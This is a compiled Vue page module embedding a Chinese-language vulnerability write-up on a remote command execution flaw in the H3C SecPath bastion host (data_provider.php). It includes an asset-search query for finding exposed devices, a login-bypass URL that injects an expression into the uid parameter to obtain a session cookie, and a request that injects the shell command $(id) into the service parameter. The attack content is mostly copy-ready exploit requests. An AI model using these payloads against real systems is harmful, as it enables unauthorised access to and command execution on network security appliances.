import{_ as a}from"./plugin-vue_export-helper-c27b6911.js";import{o as e,c as i,e as d}from"./app-58e4a7d6.js";const r={},n=d(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>H3C SecParh堡垒机 data_provider.php 存在远程命令执行漏洞，攻击者通过任意用户登录或者账号密码进入后台就可以构造特殊的请求执行命令</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>H3C SecParh堡垒机
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;H3C-SecPath-运维审计系统&quot; &amp;&amp; body=&quot;2018&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面如下</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091828935.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>先通过任意用户登录获取Cookie</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>/audit/gui_detail_view.php?token=1&amp;id=%5C&amp;uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&amp;login=admin
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091828626.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>/audit/data_provider.php?ds_y=2019&amp;ds_m=04&amp;ds_d=02&amp;ds_hour=09&amp;ds_min40&amp;server_cond=&amp;service=$(id)&amp;identity_cond=&amp;query_type=all&amp;format=json&amp;browse=true
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091828206.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,14),t=[n];function s(p,c){return e(),i("div",null,t)}const h=a(r,[["render",s],["__file","H3C SecParh堡垒机 data_provider.php 远程命令执行漏洞.html.vue"]]);export{h as default};
